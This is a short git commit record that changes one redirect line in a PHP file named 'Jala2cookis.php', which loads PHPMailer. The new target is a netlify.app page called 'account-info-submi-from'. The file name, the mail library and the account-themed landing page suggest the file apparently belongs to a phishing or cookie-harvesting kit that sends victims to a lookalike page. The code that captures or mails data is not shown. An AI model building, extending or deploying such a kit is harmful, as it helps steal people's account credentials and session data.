262405fd6fc366cf5004d7b091f37114b55960b7
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 15:13:53 +0500

    Update Jala2cookis.php

--- Jala2cookis.php
+++ Jala2cookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://zore-page-three-immadtliya.netlify.app/");
+header("Location: https://account-info-submi-from.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
